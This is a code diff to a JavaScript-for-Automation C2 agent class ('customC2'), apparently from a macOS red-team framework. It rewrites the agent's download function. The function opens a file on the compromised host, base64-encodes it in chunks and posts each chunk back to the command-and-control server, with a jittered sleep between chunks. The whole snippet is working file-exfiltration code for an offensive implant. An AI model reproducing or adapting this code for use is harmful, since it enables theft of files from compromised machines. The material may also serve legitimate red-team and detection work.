@@ -461,59 +461,67 @@ class customC2 extends baseC2{
     }
     return {};
   }
-  download(task, params){
-    let output = "";
-    if( does_file_exist(params)){
-        let offset = 0;
-        let chunkSize = this.chunk_size; //3500;
-        let full_path = params;
-        try{
-            let fm = $.NSFileManager.defaultManager;
-            let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
-            full_path = "/" + pieces.slice(1).join("/");
-            var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
-            // Get the file size by seeking;
-            var fileSize = handle.seekToEndOfFile;
-        }catch(error){
-            return {'status': 'error', 'user_output': error.toString(), "completed": true};
-        }
-        // always round up to account for chunks that are < chunksize;
-        let numOfChunks = Math.ceil(fileSize / chunkSize);
-        let registerData = {"download": {'total_chunks': numOfChunks, "full_path": full_path}};
-        let registerFile = this.postResponse(task, registerData);
-        if (registerFile['responses'][0]['status'] === "success"){
-            handle.seekToFileOffset(0);
-            let currentChunk = 1;
-            this.postResponse(task, {"user_output": JSON.stringify({
-						"agent_file_id": registerFile["file_id"],
-						"total_chunks": numOfChunks
-					})});
-            let data = handle.readDataOfLength(chunkSize);
-            while(parseInt(data.length) > 0 && offset < fileSize){
-                // send a chunk
-                let fileData = {"download": {'chunk_num': currentChunk,
-                        'chunk_data': data.base64EncodedStringWithOptions(0).js,
-                        'file_id': registerFile['responses'][0]['file_id']}, "task_id": task.id};
-                let response = this.postResponse(task, fileData);
-                if(response['responses'][0]['status'] === 'success'){
-                  offset += parseInt(data.length);
-                  handle.seekToFileOffset(offset);
-                  currentChunk += 1;
-                  data = handle.readDataOfLength(chunkSize);
+    download(task, params){
+        // download just has one parameter of the path of the file to download
+        let output = "";
+        if( does_file_exist(params) ){
+            let offset = 0;
+            let chunkSize = 512000; //3500;
+            // get the full real path to the file
+            let full_path = params;
+            try{
+                let fm = $.NSFileManager.defaultManager;
+                let pieces = ObjC.deepUnwrap(fm.componentsToDisplayForPath(params));
+                full_path = "/" + pieces.slice(1).join("/");
+                var handle = $.NSFileHandle.fileHandleForReadingAtPath(full_path);
+                if(handle.js === undefined){
+                    return {"status": "error", "user_output": "Access denied or path was to a folder", "completed": true};
                 }
-                $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
+                // Get the file size by seeking;
+                var fileSize = handle.seekToEndOfFile;
+            }catch(error){
+                return {'status': 'error', 'user_output': error.toString(), 'completed': true};
             }
-            output = {"completed":true, "file_id": registerFile['responses'][0]['file_id']};
+            // always round up to account for chunks that are < chunksize;
+            let numOfChunks = Math.ceil(fileSize / chunkSize);
+            let registerData = {"download": {'total_chunks': numOfChunks, 'full_path': full_path}};
+            let registerFile = this.postResponse(task, registerData);
+            registerFile = registerFile['responses'][0];
+            if (registerFile['status'] === "success"){
+                this.postResponse(task, {"user_output": JSON.stringify({
+                        "agent_file_id": registerFile["file_id"],
+                        "total_chunks": numOfChunks
+                    })});
+                handle.seekToFileOffset(0);
+                let currentChunk = 1;
+                let data = handle.readDataOfLength(chunkSize);
+                while(parseInt(data.length) > 0 && offset < fileSize){
+                    // send a chunk
+                    let fileData = {"download": {
+                            'chunk_num': currentChunk,
+                            'chunk_data': data.base64EncodedStringWithOptions(0).js,
+                            'file_id': registerFile['file_id']
+                        }
+                    };
+                    this.postResponse(task, fileData);
+                    $.NSThread.sleepForTimeInterval(this.gen_sleep_time());
+                    // increment the offset and seek to the amount of data read from the file
+                    offset += parseInt(data.length);
+                    handle.seekToFileOffset(offset);
+                    currentChunk += 1;
+                    data = handle.readDataOfLength(chunkSize);
+                }
+                output = {"completed":true, "user_output": `{"file_id": "${registerFile['file_id']}", "completed": true}`, "file_id": registerFile['file_id']};
+            }
+            else{
+                output = {'status': 'error', 'user_output': "Failed to register file to download", 'completed': true};
+            }
         }
         else{
-           output = {'status': 'error', 'user_output': "Failed to register file to download", "completed": true};
+            output = {'status': 'error', 'user_output': "file does not exist", 'completed': true};
         }
+        return output;
     }
-    else{
-        output = {'status': 'error', 'user_output': "file does not exist", "completed": true};
-    }
-    return output;
-  }
     upload(task, file_id, full_path){
         try{
             let data = {"action": "post_response", "responses":[
